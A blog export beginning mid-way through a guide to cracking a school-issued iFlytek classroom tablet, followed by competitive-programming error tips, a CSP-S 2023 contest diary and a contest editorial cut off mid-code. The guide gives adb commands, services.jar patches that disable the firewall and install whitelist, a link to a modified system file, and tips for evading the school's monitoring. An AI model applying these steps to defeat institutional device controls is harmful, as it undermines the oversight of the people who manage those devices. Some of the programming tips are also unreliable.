与iflytek服务共同完成对平板的各种限制：实际上，平板在启动的时候，会注册一个“iflytek”的service，该service对平板进行了若干限制。管控平台通过调用该service，实现对平板的管控。这将是我们后续进一步破解的关键。\n\n管控平台将usb魔改了，这就导致你把平板插在电脑上，会限制什么“教育平板学习机”，而不能进行文件管理什么的。\n\n管控平台还把网络进行了限制。平板采用白名单机制，如果保留管控平台，则只能打开“智学网”、“科大讯飞官网”、“畅言官网”等。若删掉管控平台，则什么网站都打不开了。更神奇的是，他不光限制了网站，甚至局域网都限制了，即你不能访问局域网内的其他设备。不仅出去的流量被限制了，进来的流量也被限制了，即你无法访问别人，别人也无法访问你。甚至平板开启wifi热点，其他设备也连不上。作者后文会讲述如何破解。\n\n该平板实际上支持蓝牙的，但一方面系统内把蓝牙设置隐藏了，另一方面管控平台把蓝牙禁用了。我们把管控平台删掉就没事了。\n\n管控平台还会强制使用内置wps。这意味着即使你自己塞了个wps进去，管控平台仍然会使用内置的wps打开文档。\n\n实际上平板的下拉状态栏是可用的，多任务键也是可用的，但都被管控平台限制了。\n\n而且如果管控平台不删除，你冒冒失失直接去大力破解平板，学校那里会得到你的违纪记录！\n\n总之，管控平台限制了不少的东西，因此我们必须删除他。但有些功能即使删除了管控平台也仍然存在限制。后文会细说。\n\n### 开启adb\n\n如果你把上文提到晨钟酱的视频看完，会发现晨钟酱对build.prop进行了修改，实现了无需打开开发者选项即可开启adb调试。我们也这样做，修改build.prop，在末尾加入如下代码：\n\n```yaml\npersist.service.adb.enable=1\npersist.service.debuggable=1\npersist.sys.usb.config=mtp,adb\nro.sys.usb.default.config=mtp,adb\n```\n\n保存，仍然是打包，刷机，清空userdata，开机。开机后插入数据线，果然弹出adb授权请求。\n\n可能又有人大喜，有了adb这不就好说了吗。直接adb install走起。这个想法我也试了，直接报错“INSTALL_FAILED”，想必科大讯飞在这上面也做了限制。\n\n可能还有些野路子，比如有人想root（能直接刷magisk，后文会讲）之后，把apk文件放入以其包名为名称的文件夹中，利用adb的root权限放入data/app中。但作者尝试过，这是无效的。\n\n但毕竟还是打开了adb，而且我们可以通过adb来与平板互传文件，比蓝牙快多了。\n\n## 进一步的破解\n\n作者一开始只做到了上述两个修改。这样可以做到两种效果：一个是保留管控平台，但多了一些软件，比如文件管理器，用起来更方便了，但不能随便往平板里传输数据。另一个是不保留管控平台，这样平板不能打开网站，智学网也打不开，但可以通过adb进行文件传输。\n\n实际上在之后的很长一段时间里我都停留在上面，没有进展。其中的网络限制问题尤为棘手，有了网络限制，平板无异于一个mp4。而科大讯飞对网络的限制并没有通过软件，因为我们在删除apk一节中已经把科大讯飞自带的所有apk，甚至管控平台都删了，但还是存在网络限制。于是我考虑科大讯飞是不是通过系统底层对网络进行了限制。\n\n后来，我在浏览解包镜像后的framework文件夹中，发现了“iflytek-mdm.jar”，个人感觉可能是科大讯飞魔改了什么底层组件，而这个jar貌似非常关键。于是我反编译看了下，果然不出我所料，这个jar里都是一些限制平板功能的函数。在分析其代码时，发现每个函数都调用了“iflytek”这个service。于是我继续从framework中找到了“services.jar”文件夹。同样反编译，果然在里面找到了，在“com.android.server.iflytek”中。在“IflytekServices”中发现了所有限制的实现方法。\n\n![](https://www.caiwen.work/wp-content/uploads/2023/12/v2-d86272bf1245f0dbc21d5b973a5eea65_1440w.png)\n\n### 破解网络限制\n\n“addNetworkAccessWhiteList”想必就是添加某个网址到白名单了。“addNetworkAccessWhiteList”调用了“addNetworkAccessWhiteListInternal”\n\n在“addNetworkAccessWhiteListInternal”函数中说明了科大讯飞网络限制的原理。\n\n![](https://www.caiwen.work/wp-content/uploads/2023/12/kdpj1.png)\n\n![](https://www.caiwen.work/wp-content/uploads/2023/12/kdpj2.png)\n\n![](https://www.caiwen.work/wp-content/uploads/2023/12/kdpj3.png)\n\n![](https://www.caiwen.work/wp-content/uploads/2023/12/kdpj4.png)\n\n大概就是建了个“netwhitelist.txt”，然后往里面写了白名单地址，然后还在“settings”里写了白名单地址。当然这些都不重要。非常关键的代码为：\n\n![](https://www.caiwen.work/wp-content/uploads/2023/12/v2-975a4b691d1b6aa36821e18047e531d0_1440w.png)\n\n其中510行代码看起来是开启防火墙的意思。其调用了NetworkManagementService的setFirewallEnable。然后我转到com.android.server.NetworkManagementService中找到了setFirewallEnable这个函数。于是就有了这样的一个思路：修改代码，使传入的参数无论是false还是true，一律改成false。但我还是第一次接触安卓逆向，所以对应的smail代码不知道怎么实现比较稳妥，万一改完刷进去开不开机就很浪费时间。于是我干脆直接把这里的代码全部删掉，改成直接“return void;”\n\n使用apktool将services.jar反编译为smail文件\n\n![找到对应方法](https://www.caiwen.work/wp-content/uploads/2023/12/v2-77700369eb445fc6536b57bfbdd584e5_1440w.png)\n\n![修改](https://www.caiwen.work/wp-content/uploads/2023/12/v2-301e39047f14a0e1b9f7c422335cbb2b_1440w.png)\n\n实际上科大讯飞貌似除了对网址有白名单限制，对应用访问网络也有白名单限制，也和上述差不多的步骤操作即可。\n\n然后编译回去，把修改后的services.jar替换掉原来的。然后打包，刷进去，清userdata，开机，不出意外就成功解除网络限制了。并且平板开热点的话，其他设备也能连上了。\n\n### 破解apk安装限制\n\n其实一开始除了思考如何破解网络限制之外，我还有一直考虑如何破解apk安装限制。上文提到，打开apk后进度条走到一半显示“应用未安装”。于是我怀疑科大讯飞魔改了packagemanager。因为adb也无法安装，所以显然不是修改的packagemanager.apk，更可能是PackageManagerService。而这个代码量巨大，直接反编译甚至报错了，所以不能直接从这里着手。\n\n而自从我们破解网络限制之后，貌似可以如法炮制，以类似的方法破解应用安装限制。\n\n同样在iflytek服务中发现一个与之有关的方法。\n\n![大概意思是将包名放入settings中的install_whitelist中](https://www.caiwen.work/wp-content/uploads/2023/12/v2-d7182bef5b60ae65442d1ba8ea0cadf6_1440w.png)\n\n看样子包名存在于这里面的apk才可以被安装。\n\n接下来我们上文开启的adb调试就有用了。将平板连上电脑，在命令行中执行但我在adb shell中输入\n\n```bash\nsettings put global install_whitelist \"要安装的apk包名\"\n```\n\n然而仍然不起作用。貌似到这里就进入死胡同了。我不太甘心，于是考虑全局搜索“whitelist”，果然在一个地方找到了判断apk是否可以安装的代码。真相大白了，科大讯飞非常的sb，他判断一个apk是否被安装，判断的是 `;包名;` 是否存在于install_whitelist中（正常人应该是按分号分割，得到数组之后再去判断吧）。我们上述的adb指令需要改为\n\n```bash\nsettings put global install_whitelist \";要安装的apk包名;\"\n```\n\n前后都需要加上分号。\n\n回到平板，使用fv文件管理器安装对应的apk。不出意外，安装成功。\n\n后续平板上想要安装apk都需要先连上adb，然后执行一行指令才能继续安装。当然仍然可以仿照破解网络限制的方法，修改PackageManager的代码（如果你是大佬的话）。\n\n为了让平板脱离电脑也能自由安装软件，我想了个法子，你可以使用shizuku，用rish结合termux或者mt管理器自带的终端模拟器，在平板上自己对自己进行adb，这样就不用其他设备辅助了。\n\n### 其他的破解\n\n通过阅读iflytek服务的代码，可以了解更多的限制的实现，从而进行破解。这里给出几个比较关键的限制的解除方法。\n\n- `adb shell settings put global enter_app_detail_disabled 0`：解除进入应用详情界面的限制。不解除的话无法从设置中进入应用详情页，也就无法卸载安装过的应用。\n\n- `adb shell settings put global home_key_disabled 0`：解除home键的限制（不过貌似解除了之后按下home键仍然无法返回桌面。盲猜按下home键是返回到原来自带的IFlySCLauncher，但是这个被我们删掉了，所以home键失效。可能把nova启动器的包名改成IFlySCLauncher的包名就可以了？）。\n\n- `adb shell settings put global task_key_disabled 0`：解除多任务键的限制（没想到吧，平板的多任务键没坏，只不过是被禁用了）。\n\n- `adb shell settings put global status_bar_expand_panel_disabled 0`：解除下拉状态栏的限制（从顶部往下拉也是可以拉动的，只不过以前也是被禁用了）。\n\n实际上iflytekservice中还有更多的限制，如有需要可以查看源码然后考虑破解。\n\n## 更多的探索\n\n实际上经过上述的破解，平板差不多已经接近可用了。不过中间作者还进行了更多的尝试。\n\n### root\n\n本人尝试了刷入酷安一位网友提供的magisk修补过的boot镜像，开机后虽然root了，但wifi也打不开了，很神奇。也有可能是那位网友提供的为市场版的平板的修补镜像，而我是课堂版。实际上也可以自己装上magisk，修补一下，不过我个人感觉即使root又能怎样？于是就不浪费这时间了。感兴趣的可以自行尝试。\n\n### gsi\n\n使用treble info可以看到，该平板支持treble project，且为arm64架构，aonly分区。但本人尝试了havoc和lineage的gsi，均失败。后来了解到可能是不解bl锁，即使是9008强制刷system分区搞gsi也不可以？\n\n## 后记\n\n本文可能是全网第一个近年的x1pro课堂版破解教程。奇怪的是，全网对于课堂版几乎只字不提。而网上已有的内容，大多数给人一种小学生的感觉，没啥技术含量。不过仍然感谢文中提到的文章/视频给我的思路。作者对这个平板研究了很久，中间遇到不少问题，并非教程呈现出来的那么顺利。在最后成功破解一个又一个难关后，心里十分的兴奋。\n\n课堂版平板貌似是专门提供给学校使用的。而本人所在学校在下发平板后，并没有好好教给老师如何利用。平板唯一的作用似乎就是打开智学网。而本人对其进行破解后，或许才是这个平板应有的样子。\n\n同时也感到了科大讯飞的敷衍。对于一个面向高中生的平板，该平板充斥大量小学和初中的东西，而且一大半的内置功能都已经废掉了。本以为科大讯飞会在防破解上下足功夫，但没想到这么简单就被破解了（虽然实际上破解起来也不是很轻松）。\n\n平板破解后差不多就跟普通平板一样了。不过虽然这平板有点年头了，但大多数软件还是处在能用的水准。minecraft可以流畅运行。pvz2也可以，但加载速度慢了点。原神就别想了，但是可以玩云游戏。实测白眼跑分单核95，多核749，还不如华强北老玩家mt6735。通知貌似也被砍了，把qq挂在后台收不到通知，其他应用的通知也无法显示。有意思的是这个平板内存貌似还虚标了，写的是3g，用白眼暴力填充，只有2g。\n\n这个平板可视角度比较差，因此你把亮度调低就可以在教室里光明正大地玩了，因为除非凑到屏幕面前，否则根本看不清屏幕显示的是什么。\n\n能看到这里的人有福了，上述修改services.jar的过程还是有点硬核的，所以这里给出我已经修改好的services.jar，顺便还有上面用到的apk：[https://wwi.lanzouq.com/b0fhtggcb](https://wwi.lanzouq.com/b0fhtggcb)，密码a4ho。\n\n作者这里还存有已经修改过的system镜像，如果你有需要，可以联系作者获取（无偿）。\n\n","summary":"本文详细介绍了科大讯飞X1pro课堂版的破解思路与破解过程","key":["科大讯飞","平板","破解","刷机","root","x1pro","课堂版"],"tags":[{"value":"经典文章","color":"success"}],"path":["刷机","科大讯飞X1PRO课堂版破解探究.md"],"background":"https://www.caiwen.work/wp-content/uploads/2023/12/未命名.png","recommend":true,"status":"published"},{"type":"Article","title":"OI中常见错误及策略","id":"noip-changjian-cuowu","createTime":"2023-10-20T02:10:00.000Z","updateTime":"2025-09-05T13:34:06.571Z","content":"\n## IO\n\n- 注意模数看好了不要写错（建议拿鼠标复制下来）\n\n- 看清楚输出的是 `YESNO` 还是 `YesNo` 还是 `YE5N0` （测大样例的时候应该能发现）\n\n- 注意有没有把调试信息删除\n\n:::info 补充\n事实上，你可以通过使用 `std:cerr<<\"...\"` 来输出调试信息，这样即使你忘记去掉了，也不会把调试信息输出到输出文件里。\n\n但还需要注意， `cerr` 比较慢\n\n综上，最好的方案应该是 `cerr` 输出调试信息，写完题目后全文查找 `cerr` 来删除调试信息\n:::\n\n- 看清楚 `freopen` 的文件名，文件后缀名，`w` 和 `r` ，`stdin` 和 `stdout` 是否对应。你最好不要第一行写完 `freopen` 之后直接复制到第二行，这容易出问题！每年都有无数的人踩了这个坑！\n\n- 看清楚无解输出什么，不要想当然以为无解就输出 `-1`\n\n- 看清楚题目的名称，比如之前有人csp，题目名称 `snake` 写成了 `snack` ，还是建议直接从题目pdf里复制下来\n\n- 注意如果 `#define int long long` ，`scanf` 的时候不应该 `%d` 而应该 `%lld`\n\n::: info 注意\n不出现特殊情况的话我们还是非常建议使用 `#define int long long`，因为在需要取模的题中，你可能因为某个变量没开 long long 就导致计算结果出现错误，又或者是题目需要开 long long ，但题面并没有很明显告诉你。\n\n还应该注意 `#define int long long` 会导致运行变慢，如果你确信题目 100000% 不需要开long long，而且计算出来的时间复杂度可能擦边过，那么就不要开 long long\n\n综上，我们还是建议开 `#define int long long`，因为比赛的题目开 `O2` 且 CCF 的评测机配置不低，TLE 总是比 WA 好看些\n:::\n\n- 尽量使用万能头，防止忘记使用某个头文件在 windows 下编译通过但在 linux 下编译不通过（况且你可能忘记了一些函数是在哪个头文件里）。\n\n::: info 注意\n但同时，你还要注意使用了万能头会导致一些变量名冲突。比如 `y1`\n\n所以你实在担心，并且想稳一稳，可以考虑比赛快结束前打开NOI Linux编译一遍\n:::\n\n- 多测一定要记得清空！！！！！！！！！！！！\n\n- 多测的时候，如果数据读到一半就可以算出最后答案了（一些特殊情况），那么你仍然要继续读入剩余数据\n\n- 最好不要用 `ios::sync_with_stdio(false)` 这种关闭流同步，这会导致包括不能与 `scanf/printf/getchar` 混用，和文件读写使用会出现问题等各种奇怪的问题。使用快读+cout是一种稳妥的方法。\n\n- `cout` 的时候千万不要写 `endl` ！！！！！！！！！！，一定要使用 `\\n`\n\n- 看清楚行和列。在后续写代码的时候行和列也不要搞反！！！！！\n\n- `cout<<1.00` 会输出1而不是1.00\n\n- 浮点数要用printf输出，如果使用cout输出的话，可能输出的内容变成了科学计数法，导致wa。\n\n## 数组/变量\n\n- 不要开 1e6 或者是 2e5 个deque，如果能手写的话尽可能手写，不然会导致 mle 的情况。这种情况在 NOIP2022 和 NOI2022 中都已经坑害了不少选手\n\n- 不要对大数组进行类似于 `int foo[10000000]={1}` 的操作，这会导致编译时间非常慢，且编译后文件非常大，在评测时直接 ce。\n\n- 和上面的类似，结构体赋初始值需要在构造函数里面赋，否则也会导致上述错误https://www.luogu.com.cn/discuss/713864\n\n- 无向图记得开两倍数组！\n\n- 看清楚你要开多大的数组！\n\n- 如果你要打部分分，更要看好你要开多大的数组，不要想当然地直接开与部分分数据范围一样大小的数组，也不要无脑开100%数据范围大小的数组！\n\n- 不要就开整整好的数组大小，永远都多开几个，比如1e6开1000006的大小，这样会带来很多福利\n\n- 如果你的函数参数传递了数组，比如 `void fun(int arr[])` ，此时在fun函数内进行 `memset(arr,0,sizeof arr)` 是错误的。因为arr实际上传来的是指针，而对一个指针进行sizeof操作不是其原本代表的数组的大小。因此，对于第三个参数，你需要传递确定的大小\n\n- 如果你代码数组有的从下标0开始有的从1开始，那你脑子必须要时刻清楚应该怎么做\n\n- 函数内开的变量或者是数组初始值为随机数，记得一定要赋初始值\n\n- 注意函数内的变量名不要和函数外的变量名相同，不然会导致各种奇怪错误的发生。比如全局有l和r，枚举四层循环时枚举了i,j,k,l\n\n- 无符号的数据类型和有符号的数据类型混用（运算/比较）的时候容易出现问题，多加小心！\n\n- 注意合适的数组清空方式！一言不合就memset容易tle\n\n- 如果你会指针，不要随便炫技，指针会导致运行速度变慢\n\n- 你最好使用 `cout<<sizeof(arr)/1024/1024;` 看数组占用大小来防止mle\n\n- 赋无穷大的时候使用0x3f3f3f3f（4个3f）可以使得两个无穷大相加不会爆int，对于long long需要使用0x3f3f3f3f3f3f3f3f（8个3f）。如果你不需要两个无穷大相加，那么可以直接使用 $1e18$ 作为无穷大（大概 $2^{60}$）。为了防止出现re，你最好`(long long)1e18`\n\n- double数组memset初始化正无穷第二个参数用127，经测试floyed不会爆负数，且比1e10还要大\n\n- string类型的数组有概率会出现奇怪错误\n\n- string容易出问题，还是用 `char[]` 吧。你可以采用形如 `cin>>str+1` （其中str为char数组）的方法读入字符串，而且这样读入是从数组下标为1的位置开始读入的。使用 `strlen(str+1)` 可获得字符串长度\n\n- 结构体中使用了string，再`memset(a,0,sizeof(a))`，在程序运行结束之后会产生奇怪的re。在linux上没有，在windows下会有。建议在结构体中字符串用char[]\n\n- 数组越界，可能不re，而是wa，并且可能出现灵异错误（比如把另外一个变量的值给修改了），如果你debug的时候发现灵异错误，不要以为是什么bug，可能是你数组越界了\n\n- 使用科学计数法，即“1e多少”这样的形式时需要注意，这种字面量的数据类型是浮点数，不是整数，即使你表示的数字没有小数点！这可能会导致ce\n\n# 编译\n\n- 由于windows的栈空间有限制，评测的时候栈空间和内存限制是相等的，因此你可能在devc++里re了，但实际上是ac的。你需要在编译选项里加上 `-Wl,--stack=102400000` 开增大栈大小\n\n- 最好加上 `-O2` 的编译参数，防止你没开O2是对的，但是最后评测开O2了就re了\n\n:::info 注意\n但是你还需要注意，手动开了O2可能会导致你在debug的时候发现一些中间变量被优化掉了，看不到了，你需要心里有数\n:::\n\n- 使用编译参数 `-Wall -Wextra -Wshadow` 可以尽可能显示编译的Warning，你的程序不应该有任何Warning，除非你确定出现的Warning会发生什么\n\n- 你最好不要直接在代码里写 `1e9` 这种表达式，容易出现CE\n\n- 检查非void返回类型的函数是不是都有返回值，定义了返回值类型却没有返回一个值会导致RE\n\n- stringstream的clear不是清空！ 清空要这样 `ss.str(\"\");`\n\n- 如果比赛最后评测使用c++17，那么你要倒吸一口凉气了，因为c++17引入了若干保留字，包括但不限于 `size`，`next` 等\n\n## 做题\n\n- 如果最后结果是相减再输出，且要求取模，一定要 `(a-b+mod)%mod`，否则会输出复数\n\n- 暴力能优化就多优化优化，多过一个点可能就一等了\n\n- 使用滚动数组进行优化时，看好了最终答案用哪个数组！\n\n- 状压dp由于$n*2^n$的极限复杂度，在枚举状态的大循环里面要避免大常数操作。比如可以预处理的数据要预处理。以及不 `#define int long long`\n\n- 一定要再三确定快读没有打错，不然全爆零！！！！\n\n- 要注意留出时间认真审题（最后草草审题写暴力大概率爆零）。\n\n- 如果题目数据比较容易生成，暴力容易写，**而且时间充裕**，那么最好使用对拍。\n\n- 对拍可以考虑生成数据范围小且比较特殊的数据，这样比中等规模随机数据相比对拍速度更快，且出现问题调试起来也更加方便\n\n- `两片雪花之间`，注意顺序，不一定是l小于r\n\n- 求两点距离的dis函数，需要这样写 `(double)(sqrt((double)(dx[a]-dx[b])*(dx[a]-dx[b])+(double)(dy[a]-dy[b])*(dy[a]-dy[b])))` 多加几个double，否则会造成精度损失，进而wa\n\n- 二分时，如果l和r有负数，那么应该用(l+r)>>1而不是(l+r)/2，否则会出现MLE错误\n\n- 有可能图不连通\n\n- 题目如果没有特殊说明，重边和自环最好也要考虑考虑\n\n- 判断元素是否存在于map中，不要使用 `[]==`，要用find，因为调用[]会在map中生成一个节点 多次判断存在会使长度非常大\n\n- 搜索时慎用map判重！会带来负优化\n\n- `set` 要用自带的二分查找函数，否则复杂度会和暴力同等（CSPS2021T1）\n\n- 离散化，最后是 `-a-1`。二分查找最后是 `-a`\n\n## 应试\n\n- 进考场之后千万不要碰电脑\n\n- 考试的时候不要小声嘟囔，即使忍不住嘟囔也不要带脏字，不然被判定为辱骂CCF会被禁赛一年\n\n- 不要拿记事本看大样例，因为大样例的换行符是linux格式的换行符，在windows的记事本中无法显示。正确的打开方式是把样例文件直接拖入devc++的窗口里查看\n\n- 测大样例时，devc++会显示运行时间，根据经验，你在考试的电脑上运行6s的程序都可以在正式评测时以1s以内的时间运行完毕，所以不需要担心tle问题\n\n- 使用fc进行对比时可能出现问题，详见本文“checker”一节\n\n- 由于比赛时间紧张，如果你的代码不需要重新编译的话，可以按F10直接运行，省掉重新编译的时间。\n\n- 不要在代码里出现CCF字样，否则禁赛1年\n\n- 如果需要对暴力算法进行优化，请务必确保你最开始想到的暴力算法是正确的，不然你会浪费大量时间对一个假的做法进行优化\n\n- 根据经验，时限比较小的题目一般是难度比较低的。数据范围给的比较简单的题目一般是难度比较低的。t1和t2中有一个本场比赛最简单题目，t2和t3有一个本场比赛次简单题目，t4永远是最难的（上述规律仅为一般规律）\n\n# 其他\n\n- 注意运算符的优先级。如果你怕出事的话，我们建议你多用几个括号括起来\n\n- `min(a,b)`写成了`(a,b)`\n\n- for循环的上界不要随时计算，比如 `i<=sqrt(q)`,`i<=strlen(s)`\n\n::: info 补充说明\n这里有个神奇的错误：string的.size()容易爆，应该先 `int len=s.size()` 预先储存长度大小，不然频繁调用会发生莫名错误\n:::\n\n- 三目判断表达式，冒号两边必须是同一数据类型。比如 `(ans==10? 'X':ans)` 这个代码就会出现莫名其妙的问题 （P1055）\n- 最好不要对string进行判等！\n- 数论题一定要注意取模，一个地方忘记了就会wa\n\n## 常见算法错误\n\n**快速幂**\n\n- 在引用cmath头文件，或者万能头之后，快速幂函数就不要命名为pow了。直接使用pow会调用cmath的pow，而不是你自己的快速幂函数。\n\n**并查集**\n\n- `while(x!=fa[x])` 写成了 `if(...)`\n\n- 并查集没有初始化\n\n- 并查集合并时注意一定是合并两个元素的祖先！！！！！\n\n**st表/倍增求lca**\n\n- st表取lg的时候从2开始循环，倍增求lca取lg的时候从1开始循环\n\n- st表 `j<=n-(1<<i)+1;` `st[r-(1<<k)+1][k]` 两处注意+1\n\n- 倍增求lca `x=fa[x][lg[dep[x]-dep[y]]-1];` `int k=lg[dep[x]]-1;k>=0;k--` 注意两处-1\n\n**主席树**\n\n- 注意开32倍大小\n\n**fhq-treap**\n\n- split完忘了 `update(now)`\n\n- 注意开数组时除了算上操作次数，还要算上一开始就插入的数\n\n**线段树**\n\n- 注意开4倍空间\n\n- 别忘记pushdown和pushup\n\n- 别忘了一开始build建树\n\n- modify操作到最后别忘返回（写dfs的时候也要注意这一点）\n\n**图论**\n\n- 遍历图的时候，把 `edge[i]` 写成了 `edge[x]`\n\n- 无向图，edge数组忘开两倍\n\n- tarjan算法时，将点弹出栈后忘记 `vis[x]=false`\n\n- 求次短路的时候优先队列中以dis1为关键字排序\n\n- 求最短路的时候从队列/优先队列中取出元素后忘记pop\n\n- kruskal重构树开二倍大小\n\n- 看清楚题目让点差分还是边差分，写的时候不要把边差分和点差分写混了\n\n## checker\n\n春季测试时给出的大样例，如果在windows系统下直接使用fc进行对比，会报有差异，即使你的输出的答案文件是一样的。这可能是大样例的换行符出了点问题。如果你遇到了相同的问题，不要惊慌，你可以手写checker来进行对比\n\n```cpp\n#include<bits/stdc++.h>\nusing namespace std;\nsigned main(){\n\tifstream a,b;a.open(\"tree.out\");b.open(\"tree6.ans\");\n\tint x,cnt=0;\n\twhile(b>>x){//直到读不到数字了才结束\n\t\tint y;a>>y;\n\t\tcnt++;\n\t\tif(x!=y){\n\t\t\tcout<<\"WA at \"<<cnt<<endl;\n\t\t\treturn 0；\n\t\t}\n\t}\n\tcout<<\"AC! \"<<cnt;\n\treturn 0;\n}\n```\n\n## 编译参数\n\n你需要包含题面第一页所写的所有编译参数，除此之外，还有下面这些\n`-std=c++14 -O2 -Wall -Wextra -Wshadow -Wl,--stack=102400000`\n\n","summary":"NOIP中一些常见的踩坑、易错的地方","key":["noip","错误","踩坑","爆零"],"tags":[],"path":["算法竞赛","OI中常见错误及策略.md"],"background":"https://pic.caiwen.work/i/2025/01/22/67909e51b8f1c.jpg","recommend":false,"status":"published"},{"type":"Article","title":"CSP-S 2023 游记","id":"csps2023","createTime":"2023-10-19T13:05:00.000Z","updateTime":"2025-09-05T13:34:04.976Z","content":"\n## 2023-10-17~20\n\n刚考完市联考，大寄，数学光选填扣了25pts，物理最后一题没用配速法，脑子抽了用的洛伦兹力分量式，虽然最后推出来的式子是对的，但判卷老师的水平大概率看不懂...直接寄14分。化学生物目测都扣30+pts，一时间绷不住，直接请假回家了，顺便准备准备csp...\n\n在家里主要看了看之前的笔记，打了点模板题，做了一下之前口胡的题（然后发现口胡的题基本上做法都假了）\n\n市联考出分，校排名rank10+->rank91，班排名rank2->rank13，更难绷了，一晚上做不下题。作为高三的选手顶着文化课压力参加oi太难了。虽然不能进省队了，但仍然希望csp和noip考个高分证明自己的实力（去年csp和今年春测一个比一个寄）\n\n## 2023-10-21\n\n早上7:50在校门口集合，高二高三一共5人，有一人提前请假回家，一共4人，被教练带出校门去高铁站。只能中午和晚上请假出校门，所以早上背着书包往校门走的时候貌似回头率不低。\n\nHE弱校，但今年暑假就提前教了一些新高一的，然后教练打算让他们也试试，所以算上高一一共20多人，应该是我们学校第一次带队这么多人，但还是坐高铁去燕大，于是高铁车厢被我们学校攻占。\n\n路上听说普及组还没考完题面就泄露了，还有考场没断网的，还有开考都没把电脑搞好的...今年cspj挺乱。普及组12点整刚考完，一打开洛谷自测，t1数据都有了。看了一眼，ccf怎么这样，这不约瑟夫问题吗，而且不太签到。\n\n中午睡觉前给lh讲了一下编译选项，没想到lh没用过编译选项。后面就直接睡觉了，12:30睡，13:00起。酒店隔音贼差，再加上作为高三选手倒数第二次比赛机会，赛前非常紧张，怕下午t1做不出来，于是一中午没睡着，或者是刚要睡着就被外面吵醒了...\n\n下午坐大巴车去考场，燕大3考区貌似门口牌子就错了，让往右拐，其实是往左拐，然后爬五楼爬到一半，只看到一张纸条，说需要从四楼另一个楼梯去五楼，搞得考场就找了很久。这回csp人多，貌似沧州的都在一个考区，于是就看不到衡中和石二的大佬了，感觉压力小了点。然后就是考场一堆小学生和初中生，还没开考就有人玩电脑。开考之后还有不少问怎么看题面的...\n\n**14:30**\n\n虽然近视眼眼镜还丢了，但还是成功看清了解压密码和pdf密码，于是不熟练地打开题面，不熟练地建好文件夹（不熟练是因为高三了赛前没时间跟着打模拟赛）。根据技巧，一般时限最短的题目比较简单，于是看了一眼，三题都是1s...然后开t1，去过春测，感觉很亲切。第一眼感觉是一个排列组合有关题目？样例解释也有点懒得解释的样子。然后一看数据范围，n≤8？？？？！这不随便写就能过，于是直接开4层for循环暴力枚举，开桶保存状态。30min直接过。\n\n**15:00**\n\n我还以为今年题目难度比较正常，没想到这么简单，感觉能小300分了，于是赶紧看t2。t2一开始考虑枚举两个位置都相同的地方，然后不断向两边扩展。但两个可消子串拼在一块的情况难搞，于是就打算扩展时顺手记录一个点为右端点的可消子串的数量。这样的话是n方复杂度，但应该可以拿倍增，再搞个数据结构维护一下，感觉应该可以ac，于是就开始写，结果发现算重了，手造了两个数据，debug了一会，发现问题，又加了点东西，发现假了，于是打算直接拿map+pair解决算重问题。结果样例二没过去...感觉最开始的做法可能就假了。中间考虑n方dp，但不知道怎么设状态比较好。最后实在不行就草草写了个区间dp，n3方，期望得分35pts\n\n**16:30**\n\n竟然是大模拟。我个人觉得自己代码能力还可以，所以感觉235也挺好？读完题目发现貌似水有点深，简单看了下t4，貌似t4部分分能得不少，但还是打算先开t3。发现t3直接模拟，递归做可能会t，于是又考虑了一会...实在没办法了，直接递归来吧，开了3个map，样例一过了，样例二给我整懵逼了，为什么结构体一大小不是32是24？我又反复读了好几遍题面，感觉没问题就应该是32，眼看时间不多了看t4\n\n**17:30**\n\n赛前做过几道二分答案的题，所以对单调性的理解比较深。于是发现t4具有单调性，可以直接二分答案，但题目中树木每天生长的高度有点不好处理...又看了几眼，发现是一次函数，不过依然不好处理。对于特殊性质，考虑直接贪心，但是树木不能随便种。小数据直接爆搜也会t，部分分根本拿不到！想到目前只有100+35+0+0=135，这么简单的题省一无望了，于是就特别着急，一着急就撕手上的皮，结果给撕出血了，满手都是血。\n\n**18:00**\n\n于是又回头做t3，感觉t3只要想办法把为什么是24不是32搞清楚，就能立刻得到不少暴力分。于是一直看题面，直到最后也没看懂。\n\n比赛结束之后，是第一个出考场的，当时心情很复杂。随着其他人出来，发现基本上都是t1很快就写完，t2打35分暴力，t3死磕，t4放弃，于是心里就平衡了不少。不过很快又紧张起来了，万一t1都写挂了就大寄了。\n\n会宾馆打开手机，洛谷群里刷屏骂ccf出的垃圾题，t2还被人扒出来原题，看了一下，是紫题，感觉做不出来也很正常。赛后突然想到t2不应该考虑回文串，应该考虑枚举右端点，然后从右往左扫，拿个栈搞一搞，就有n方50分了，并且这个做法和正解很接近。\n\n小图灵估分100+35+0+0=135，但是预测省一，没想到写点暴力就一等了。即使是这么简单的t1，很多人都写挂了。同学校高二无一人ac，高一只有一人ac。希望noip不要再出这样的题了。\n\n官方数据100+35+0+0=135，没想到t4能直接骗80甚至90。官方数据一如既往的水，不少人分数暴涨，这下六级钩直接飞了。\n\n","summary":"CSP-S 2023 的游记","key":["csp","2023","游记"],"tags":[],"path":["记录","CSP-S 2023 游记.md"],"background":"https://pic.caiwen.work/i/2025/01/22/67909e51b8f1c.jpg","recommend":false,"status":"published"},{"type":"Article","title":"CZOI Online #4 题解","id":"czoi-online-4","createTime":"2023-08-21T04:25:00.000Z","updateTime":"2025-09-05T13:34:06.313Z","content":"\n::: success 说明\n本篇文章是举行在2023年7月22日的 CZOI Online #4 的题解\n\n比赛页：https://www.luogu.com.cn/contest/117584\n\nT1序列：https://www.luogu.com.cn/problem/T351561\n\nT2涂色：https://www.luogu.com.cn/problem/T323309\n\nT3游戏：https://www.luogu.com.cn/problem/T323500\n\nT4中心：https://www.luogu.com.cn/problem/T325767\n:::\n\n本次比赛原本是作为CSP考前信心赛的，所以题目并没有出的很难，并且暴力分给的也还可以。\n\n由于出题人在写这篇题解的时候已经有三四月没有碰oi了，所以本篇题解只能粗略的讲一下大致做法并给出std。具体实现希望各位私下再去互相讨论。\n\n## T1 sequence\n\n本题迎面而来的两个西格玛就吓人一跳。不过仔细分析一下发现题目并不是很难理解。\n\n直接打暴力，可以通过subtask0，subtask1可能比较优秀的暴力可以通过。\n\nsubtask2不难发现，给出的序列是个回文序列。我们进一步思考这个回文序列有什么特性，会发现对于一个回文序列，对他无论进行多少次操作一和操作二，最后的效果都是一样的。\n想到这个特性之后，离正解就差一步。我们发现，一旦任何一个序列执行了第二个操作，就会变成回文序列，转化为subtask2的情况。\n\n至此，正解已经呼之欲出：枚举第一个二操作在哪一次执行。注意特判没有二操作的情况。  \n当然，本题更重要的一部分是推石子，如何才能以非常小的复杂度计算出最后要最大化的那个值。这一部分不难，自行推导。\n\n参考代码\n\n```cpp\n#include<bits/stdc++.h>\n#define _ 100005\n#define int long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define ull unsigned long long\n#define ll long long\nusing namespace std;\nconst int mod=1e9+7;\n\ninline int 